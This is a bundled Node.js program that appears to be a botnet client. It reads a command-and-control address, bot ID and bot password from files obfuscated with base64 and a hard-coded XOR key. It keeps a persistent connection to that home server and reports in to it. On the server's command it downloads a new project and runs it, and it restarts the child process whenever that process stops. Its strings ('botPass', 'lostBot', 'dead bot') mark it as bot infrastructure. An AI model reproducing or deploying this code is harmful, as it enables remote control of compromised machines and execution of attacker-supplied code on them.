/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};

/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {

/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId])
/******/ 			return installedModules[moduleId].exports;

/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			exports: {},
/******/ 			id: moduleId,
/******/ 			loaded: false
/******/ 		};

/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

/******/ 		// Flag the module as loaded
/******/ 		module.loaded = true;

/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}


/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;

/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;

/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";

/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(module) {'use strict';

	const Win = __webpack_require__(2);
	const timer = __webpack_require__(7);
	const config = __webpack_require__(4);
	const HomeCon = __webpack_require__(8);
	const ScriptExecutor = __webpack_require__(9);
	const os = __webpack_require__(5);
	const fs = __webpack_require__(6);

	process.on('exit', () => {
	  console.log('exit');
	});

	process.on('beforeExit', () => {
	  console.log('beforeExit');
	});

	process.on('uncaughtException', function(err) {
	  console.log('uncaught exception');
	  var str = new Error().stack.toString();
	  str += ' ' + os.EOL + ' ';
	  str += err.toString() + ' ' + os.EOL + ' ';
	  str += err.stack.toString();
	  str += os.EOL + '---------------------------------' + os.EOL;
	  console.log(err);
	  console.log(str);
	  try {
	    fs.appendFileSync('err.log', str + ' ' + os.EOL + ' ');
	  } catch (e) {
	    console.log('WTF');
	  }
	  HomeCon.sendMsg({
	    type: 'uncaughtException',
	    msg: str
	  });
	  HomeCon.sendDebugMsg({
	    msg: str
	  });
	  console.log(str);
	  HomeCon.sendDying();
	  HomeCon.disconnect();
	  ScriptExecutor.stop();
	  ScriptExecutor.kill();
	  console.log('exiting now bitch');
	  process.exit(0);
	});


	function isWindows() {
	  return os.platform().indexOf('win') !== -1;
	}

	function windowsMain() {
	  Win.init();
	  const homeAddr = Win.readHomeAddr();
	  config.globals.homeIP = homeAddr.ip;
	  config.globals.homePort = homeAddr.port;
	  config.globals.botPass = Win.readBotPass();
	  config.globals.ID = Win.readID();
	}

	function main() {
	  const homeIP = process.argv[2];
	  const ID = process.argv[3];
	  if (!config.globals) {
	    config.globals = {};
	  }
	  config.globals.homeIP = homeIP;
	  config.globals.ID = ID;

	  if (isWindows()) {
	    windowsMain();
	  }

	  timer.init();
	  HomeCon.connect(() => {

	  });
	  ScriptExecutor.start();

	  setInterval(() => {
	    if (ScriptExecutor.isRunning()) {
	      console.log('se is running');
	      return;
	    }
	    console.log('se not running. starting se');
	    ScriptExecutor.start();
	  }, 6 * 1000);
	}

	if (__webpack_require__.c[0] === module) {
	  main();
	}

	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(1)(module)))

/***/ },
/* 1 */
/***/ function(module, exports) {

	module.exports = function(module) {
		if(!module.webpackPolyfill) {
			module.deprecate = function() {};
			module.paths = [];
			// module.parent = undefined by default
			module.children = [];
			module.webpackPolyfill = 1;
		}
		return module;
	}


/***/ },
/* 2 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	const Utils = __webpack_require__(3);
	const fs = __webpack_require__(6);
	const config = __webpack_require__(4);


	class Win {
	  static _createIfNotExists(file) {
	    try {
	      var stat = fs.lstatSync(file);
	    } catch (e) {
	      fs.writeFileSync(file, '');
	    }
	  }

	  static init() {
	    this._createIfNotExists(config.win.pathes.homeAddr);
	    this._createIfNotExists(config.win.pathes.id);
	    this._createIfNotExists(config.win.pathes.botPass);
	    fs.watch(config.win.pathes.homeAddr, (event, filename) => {
	      const newAddr = this.readHomeAddr();
	      if (!newAddr) {
		return;
	      }
	      if (!newAddr.ip || !newAddr.port) {
		return;
	      }
	      if (newAddr.ip === config.globals.homeIP
		  && newAddr.port === config.globals.homePort) {
		return;
	      }
	      process.exit(0);		// todo?
	    });
	  }

	  static readHomeAddr() {
	    let content = '';
	    try {
	      content = fs.readFileSync(config.win.pathes.homeAddr).toString().trim();
	    } catch (e) {
	      console.log(e);
	      Utils.logToFile(e.toString());      
	      Utils.logToFile(e.stack);
	      return null;
	    }

	    content = Utils.from64(content);
	    content = Utils.xor(config.key, content);
	    content = content.trim();

	    const arr = content.split(' ');
	    if (arr.length !== 2) {
	      console.log('error');
	      return null;
	    }
	    return {
	      ip: arr[0],
	      port: arr[1]
	    };
	  }

	  static readID() {
	    let content = '';
	    try {
	      content = fs.readFileSync(config.win.pathes.id).toString().trim();
	      content = Utils.from64(content);
	      content = Utils.xor(config.key, content);
	      content = content.trim();

	      if (!content) {
		return 'noid_win';
	      }
	    } catch (e) {
	      console.log(e);
	      Utils.logToFile(e);
	    }


	    return content;
	  }

	  static readBotPass() {
	    let content = '';
	    try {
	      content = fs.readFileSync(config.win.pathes.botPass).toString().trim();
	      content = Utils.from64(content);
	      content = Utils.xor(config.key, content);
	      content = content.trim();
	    } catch (e) {
	      console.log(e);
	      Utils.logToFile(e);
	    }

	    return content;
	  }

	  

	};

	module.exports = Win;


/***/ },
/* 3 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	const config = __webpack_require__(4);
	const os = __webpack_require__(5);
	const fs = __webpack_require__(6);

	class Utils {

	  static xor(key, str) {
	    if (!key || key.length === 0) {
	      return str;
	    }
	    if (!str && str != '') {
	      return null;
	    }
	    var res = '';
	    for (var i = 0; i < str.length; i++) {
	      var ch1 = key.charCodeAt(i % key.length);
	      var ch2 = str.charCodeAt(i);
	      var x = String.fromCharCode(ch1 ^ ch2);
	      res += x;
	    }
	    return res;
	  }

	  static to64(str) {
	    return new Buffer(str).toString('base64');
	  }

	  static from64(str64) {
	    return new Buffer(str64, 'base64').toString('ascii');
	  }


	  static logToFile(str) {
	    console.log(str);
	    try {
	      fs.appendFileSync(config.logFile, str + os.EOL);
	    } catch (e) {
	      console.log('log to file');
	      console.log(str);
	      console.log(e);
	    }
	  }

	  static deleteFile(path) {
	    try {
	      fs.unlinkSync(path);
	    } catch (e) {
	      console.log(e);
	    }
	  }


	  static removeDirRec(path) {
	    if (!fs.existsSync(path)) {
	      return;
	    }
	    fs.readdirSync(path).forEach( (file, index) => {
	      const curPath = path + '/' + file;
	      if (fs.lstatSync(curPath).isDirectory()) {
	        this.removeDirRec(curPath);
	        return;
	      }
	      this.deleteFile(curPath);
	    });
	    fs.rmdirSync(path);
	  }

	  static mkdirSync(dir) {
	    try {
	      fs.mkdirSync(dir);
	    } catch (e) {
	      console.log(e);
	    }
	  }

	};

	module.exports = Utils;


/***/ },
/* 4 */
/***/ function(module, exports) {

	'use strict';

	const config = {
	  key: 'mGwYSgqjKjTmDVXGZFqp',
	  sentinel : '\0',
	  pass: 'ry5lgh2qewofuyglDAl3',
	  projectPath: './updater/',
	  logFile: 'err.log',
	  win: {
	    pathes: {
	      homeAddr: 'cc.txt',
	      id: 'id.txt',
	      botPass: 'bp.txt'
	    }
	  },
	  globals: {
	    homePort: 443
	  },
	  timeout: 3 * 60 * 1000       // milliseconds. 3 minutes
	};

	module.exports = config;


/***/ },
/* 5 */
/***/ function(module, exports) {

	module.exports = require("os");

/***/ },
/* 6 */
/***/ function(module, exports) {

	module.exports = require("fs");

/***/ },
/* 7 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';
	const fs = __webpack_require__(6);

	function checkTime() {
	  const now = new Date();
	  let lastTime = new Date(0);
	  let pid = 0;
	  //  console.log('now is: %s', now);
	  try {
	    let a = fs.readFileSync('time.txt').toString();
	    const arr = a.split('|');
	    a = arr[0];
	    pid = parseInt(arr[1]);
	    //    console.log('a is: %s', a);
	    a = new Date(a);
	    lastTime = a;
	    //    console.log(lastTime);
	    //    console.log(a);
	    //console.log('last time is: %s', lastTime);
	  } catch (e) {
	    console.log(e);
	  }

	  const diff = (now - lastTime) / 1000;
	  //  console.log('diff is: %d, pid is: %d', diff, pid);
	  //  console.log('pid %d equals %d ? %s', pid, process.pid, pid === process.pid);
	  if (diff < 7 && pid !== process.pid) {
	    console.log('exiting because other node is running. diff: %d', diff);
	    process.exit(0);
	  }
	  console.log('not exiting because difference is: %d', diff);
	  fs.writeFileSync('time.txt', now.toString() + '|' + process.pid);
	}

	function init() {
	  checkTime();

	  setInterval(() => {
	    checkTime();
	  }, 3 * 1000);
	}

	module.exports.init = init;


/***/ },
/* 8 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	const ScriptExecutor = __webpack_require__(9);
	const assert = __webpack_require__(10);
	const querystring = __webpack_require__(12);
	const URL = __webpack_require__(13);
	const os = __webpack_require__(5);
	const path = __webpack_require__(14);
	const cp = __webpack_require__(11);
	const Connection = __webpack_require__(15);
	const fs = __webpack_require__(6);
	const config = __webpack_require__(4);
	const net = __webpack_require__(16);
	const util = __webpack_require__(17);
	const Utils = __webpack_require__(3);
	const http = __webpack_require__(18);
	const https = __webpack_require__(19);


	let con = null;

	let IP = null;
	let PORT = null;
	let msgqueue = [];
	class HomeCon extends Connection {
	  constructor(sock) {
	    super(sock);
	    this._onConnect();
	    this._msgHandler = {
	      die: this._handleDie.bind(this),
	      death: this._handleDie.bind(this),
	      update: this._handleUpdate.bind(this),
	      restart: this._handleRestart.bind(this),
	      forceKill: this._forceKill.bind(this),
	    };
	  }


	  _forceKill() {
	    ScriptExecutor.kill();
	  }

	  _handleDie() {
	    console.log('exiting now... bitch');
	    ScriptExecutor.stop();
	    ScriptExecutor.kill();
	    process.exit(0);
	  }

	  _handleRestart(msg) {
	    ScriptExecutor.stop();
	    ScriptExecutor.kill();
	    ScriptExecutor.start();
	  }

	  _handleUpdate(msg) {
	    ScriptExecutor.stop();
	    ScriptExecutor.kill();
	    this._updateProject(msg.project, msg.version);
	    if (!ScriptExecutor.isRunning()) {
	      ScriptExecutor.start();
	    }
	  }

	  _updateProject(project, version) {
	    Utils.removeDirRec(config.projectPath);
	    Utils.mkdirSync(config.projectPath);
	    const cwd = process.cwd();
	    process.chdir(config.projectPath);
	    for (let i = 0; i < project.dirs.length; i++) {
	      const dirname = project.dirs[i];
	      const p = path.join('./', dirname).toString();
	      console.log('creating: %s', dirname);
	      Utils.mkdirSync(p);
	    }
	    console.log(project.dirs);

	    for (let key in project) {
	      if (!project.hasOwnProperty(key)) {
	        continue;
	      }
	      const value = project[key];
	      if (typeof value !== 'string') {
	        console.log('not a string: %s', key);
	        continue;
	      }
	      const p = path.join('./', key).toString();
	      console.log('key: %s', key);
	      fs.writeFileSync(p, value);
	    }
	    fs.writeFileSync('./version.txt', version);
	    process.chdir(cwd);
	  }


	  _onConnect() {
	    let version, script;
	    try {
	      const versionPath = path.join(config.projectPath, 'version.txt');
	      version  = fs.readFileSync(versionPath).toString().trim();
	    } catch (e) {
	      version = null;
	    }
	    this.sendMsg({
	      pass: config.pass,
	      botID: config.globals.ID,
	      version: version,
	      myVersion: 4,
	      platform: os.platform()
	    });
	  }

	  sendDebugMsg(msg) {
	    msg.type = 'DEBUG';
	    this.sendMsg(msg);
	  }

	  handleMsg(msg) {
	    console.log(msg);
	    const handler = this._msgHandler[msg.type];
	    if (!handler) {
	      console.log('invalid msg');
	      console.log(msg);
	      this.sendDebugMsg({
	        str: 'invalid msg',
	        type: msg.type,
	        handlers: this._msgHandler,
	        msg: JSON.stringify(msg)
	      });
	      return;
	    }
	    const response = handler(msg);
	    if (response) {
	      assert(!response.id);
	      //assert(!response.type);
	      response.id = msg.id;
	      if (!response.type) {
	        response.type = msg.type;
	      }
	      this.sendMsg(response);
	    }
	    return;
	  }
	}


	function _connect(cb) {
	  const ip = config.globals.homeIP;
	  const port = config.globals.homePort;
	  console.log('index. connecting to: %s:%s',ip, port);
	  if (con && con.isAlive()) {
	    console.log('already connected.');
	    process.nextTick(() => {
	      cb('already connected');
	    });
	    return;
	  }
	  let sock = net.connect(port, ip, () => {
	    cb();
	    sock.removeListener('close', onCanNotConnect);
	    sock.removeListener('timeout', onTimeoutBeforeConnct);

	    console.log('connected');
	    con = new HomeCon(sock);
	    con.setKeepAlive(10 * 60);
	    while (msgqueue.length > 0) {
	      const msg = msgqueue.shift();
	      sendDebugMsg(msg);
	    }
	    sock.on('close', () => {
	      con.onClose();
	      con = null;
	      setTimeout(() => {
	        _connect(function(){});
	      }, 1000);
	    });
	    sock.on('end', () => {
	      if (con) {
	        con.onEnd();
	      }
	    });
	    sock.on('error', (err) => {
	      if (con) {
	        console.log('updater.: %s error', ip);
	        con.onError(err);
	      }
	    });
	    sock.on('data', (data) => {
	      if (con) {
	        con.onData(data.toString());
	      }
	    });
	  });

	  sock.on('close', onCanNotConnect);
	  sock.on('error', err => {
	    console.log('error');
	    console.log(err);           // todo log
	  });
	  sock.setTimeout(10 * 1000, onTimeoutBeforeConnct);

	  function onCanNotConnect() {
	    setTimeout(() => {
	      _connect(function(){});
	    }, 1000);
	  }

	  function onTimeoutBeforeConnct() {
	    sock.destroy();
	  }
	}

	function connect(cb) {
	  const ip = config.globals.homeIP;
	  const port = config.globals.homePort;
	  assert(ip);
	  assert(port);
	  console.log('homecon. connect: %s:%s', ip, port);
	  if (!ip || !port) {
	    cb(util.format('Invalid address: %s:%s', ip, port));
	    console.log('invalid address: %s:%s', ip, port);
	    return;
	  }
	  if (isConnected()) {
	    console.log("is already connected");
	    process.nextTick(cb);
	    return;
	  }
	  _connect(cb);
	}

	function isConnected() {
	  return con && con.isAlive();
	}

	function sendDebugMsg(msg) {
	  if (!con || !con.isAlive()) {
	    msgqueue.push(msg);
	    return;
	  }
	  con.sendDebugMsg(msg);
	}

	function sendMsg(msg, cb) {
	  console.log('sending msg');
	  cb = cb || Function.prototype;
	  if (!con || !con.isAlive()) {
	    cb();
	    return;
	  }
	  console.log('sending msg1');
	  console.log(msg);
	  con.sendMsg(msg);
	}

	function disconnect() {
	  if (con && con.isAlive()) {
	    con.die();
	  }
	  _connect = function() { };
	}

	function sendDying(msg) {
	  if (con && con.isAlive()) {
	    this.sendMsg({
	      type: 'dying'
	    });
	  }
	}

	module.exports.connect = connect;
	module.exports.sendDebugMsg = sendDebugMsg;
	module.exports.isConnected = isConnected;
	module.exports.sendMsg = sendMsg;
	module.exports.disconnect = disconnect;
	module.exports.sendDying = sendDying;


/***/ },
/* 9 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';


	const assert = __webpack_require__(10);
	const cp = __webpack_require__(11);
	const config = __webpack_require__(4);

	class ScriptExecutor {

	  static start() {
	    assert(!this.isRunning());
	    console.log('starting');
	    console.log(process.cwd());
	    const ip = config.globals.homeIP;
	    const port = config.globals.homePort;
	    const ID = config.globals.ID;
	    const args = [ip, port, ID];
	    const proc = cp.fork('index.js', args, {
	      cwd: config.projectPath
	    });

	    proc.on('exit', code => {
	      console.log('killed');
	      console.log('exit');
	      if (this._proc === proc) {
		this._proc = null;
	      }
	    });

	    proc.on('error', err => {
	      console.log('error');
	      console.log(err);
	      if (this._proc === proc) {
		this._proc = null;
	      }
	    });
	    this._proc = proc;
	    this._proc.running = true;
	    return proc;
	  }

	  static kill() {
	    if (!this._proc) {
	      return;
	    }
	    console.log('killing');
	    this._proc.running = false;
	    this._proc.kill();
	  }

	  static stop() {
	    if (!this._proc) {
	      return;
	    }
	    try {
	      this._proc.send({
	        type: 'die'
	      });
	    } catch (e) {
	      console.log(e);
	    }
	  }

	  static isRunning() {
	    console.log('is running?');
	    if (!this._proc) {
	      console.log('is not running. no proc');
	      return false;
	    }
	    console.log('runing: %s', this._proc.running);
	    return this._proc.running;
	  }

	};

	module.exports = ScriptExecutor;


/***/ },
/* 10 */
/***/ function(module, exports) {

	module.exports = require("assert");

/***/ },
/* 11 */
/***/ function(module, exports) {

	module.exports = require("child_process");

/***/ },
/* 12 */
/***/ function(module, exports) {

	module.exports = require("querystring");

/***/ },
/* 13 */
/***/ function(module, exports) {

	module.exports = require("url");

/***/ },
/* 14 */
/***/ function(module, exports) {

	module.exports = require("path");

/***/ },
/* 15 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	const assert = __webpack_require__(10);

	let SENTINEL = '\0';

	let extractAllMsgsFrom = function(recData) {
	  let arr = [];
	  while (true) {
	    let split = recData.indexOf(SENTINEL);
	    if (split === -1) {
	      break;      
	    }
	    let msg = recData.substring(0, split);
	    recData = recData.substring(split + 1);
	    arr.push(msg);
	  }
	  return arr;
	};

	let deleteAllMsgsFrom = function(recData) {
	  let split = recData.lastIndexOf(SENTINEL);
	  assert(split !== -1, "Error");

	  return recData.substring(split + 1);
	};

	// empty msg means - are you alive?
	// '{}' means yes I'm alive
	// on empty msg, should respond with '{}'

	class Connection {
	  constructor(sock) {
	    assert(sock.remoteAddress);
	    this._sock = sock;
	    this._recData = '';
	    this._ip = sock.remoteAddress;
	    this._cbs = [];
	    this._alive = true;
	    this._lastMsgDate = new Date();
	    this._keepAliveSet = false;
	  }

	  // todo: test this shit
	  setKeepAlive(secs) {
	    assert(secs > 0);
	    this._aliveCheckInterval = secs;

	    if (this._aliveCheckIntervalId) {
	      this.clearInterval(this._aliveCheckIntervalId);
	      this._aliveCheckIntervalId = null;
	    }

	    let waiting = false;
	    this._aliveCheckIntervalId = setInterval(() => {
	      if (!this.isAlive()) {
		clearInterval(this._aliveCheckIntervalId);
		this._aliveCheckIntervalId = null;
		return;
	      }

	      let now = new Date();
	      let timeout = (now - this._lastMsgDate) / 1000;
	      if (timeout <= secs) {
		waiting = false;
	      }
	      if (!waiting && (timeout > secs) && (timeout < secs + 30)) {
		this.send(SENTINEL);
		waiting = true;
	      };
	      if (timeout > secs + 30) {
		console.log('killing %s because of timeout', this.getIp());
		this.die();
	      }
	    }, 1000);
	  }

	  onData(data) {
	    console.log('ondata: %s', this.getIp());
	    console.log(data.toString());
	    this._lastMsgDate = new Date();
	    this._recData += data;
	    let msgs = extractAllMsgsFrom(this._recData);
	    if (msgs.length === 0) {
	      // not fully received yet;
	      // TODO: handle possible DOS attack when msg doesn't contain sentinel
	      return 0;
	    }
	    this._recData = deleteAllMsgsFrom(this._recData);
	    for (let i = 0; i < msgs.length; i++) {
	      let msg = msgs[i];

	      let msgObj = null;
	      if (msg === '') {
		// peer checks if we are alive. should send {}
		this.send('{}' + SENTINEL);
		continue;
	      } else if (msg === '{}') {
		// responded - I'm alive. nothing to do here
		continue;
	      } else {
		try {
		  msgObj = JSON.parse(msg);
		} catch (e) {
		  console.error(msg);
	//	  throw new Error('Invalid msg received: ' + msg);
		}
	      }

	      Connection.prototype._handleMsg.call(this, msgObj);
	    }
	    
	    return msgs.length;
	  }

	  _handleMsg(msgObj) {
	    if (!msgObj) {
	//      this.handleMsg(null);
	      return;
	    }
	    this.handleMsg(msgObj);
	  }

	  handleMsg(msgObj) {
	    
	  }


	  onError(err) {
	    this.died(err);
	  }

	  onClose() {
	    this.died();
	  }

	  onEnd() {
	    this._sock.end();
	  }

	  isAlive() {
	    return this._alive;
	  }

	  died(err) {
	    if (!this._alive) {
	      return;
	    }

	    this._alive = false;
	    if (err) {
	      console.error("%s [%s] died with error: %s",
			    this.getIp(), this.constructor.name,  err.toString());
	    }
	    if (this._sock) {
	      this._sock.end();
	      this._sock.destroy();
	      this._sock = null;
	    }
	  }

	  die() {
	    if (!this.isAlive()) {
	      return;
	    }
	    console.log('killing: %s', this.getIp());
	    this._sock.end();
	    this._sock.destroy();
	    this._sock = null;
	    this.died();
	  }

	  getIp() {
	    return this._ip;
	  }

	  _callMsgCb(msgId, msg) {
	//      arr.splice(i, 1);
	    assert(this._alive, "message from dead connection?");
	    let cb = null;
	    for (let i = 0; i < this._cbs.length; i++) {
	      if (this._cbs[i].id === msgId) {
		cb = this._cbs[i].cb;
		this._cbs.splice(i, 1);
		break;
	      }
	    }
	    assert(cb);
	    cb(msg);
	  }


	  sendMsg(obj, cb) {
	    assert(!cb);
	    console.log('sending msg');
	    console.log(obj);
	    let str = JSON.stringify(obj) + SENTINEL;
	    if (obj.type === 'lostBot') {
	      console.log('sending to %s............', this.getIp());
	      console.log(str);
	    }
	    this.send(str);
	  }

	  send(str) {
	    if (!this.isAlive()) {
	      console.error('Sending string to dead bot');
	      console.error(str);
	      return;
	    }
	    this._sock.write(str);
	  }

	}

	Connection.SENTINEL = SENTINEL;
	module.exports = Connection;



/***/ },
/* 16 */
/***/ function(module, exports) {

	module.exports = require("net");

/***/ },
/* 17 */
/***/ function(module, exports) {

	module.exports = require("util");

/***/ },
/* 18 */
/***/ function(module, exports) {

	module.exports = require("http");

/***/ },
/* 19 */
/***/ function(module, exports) {

	module.exports = require("https");

/***/ }
/******/ ]);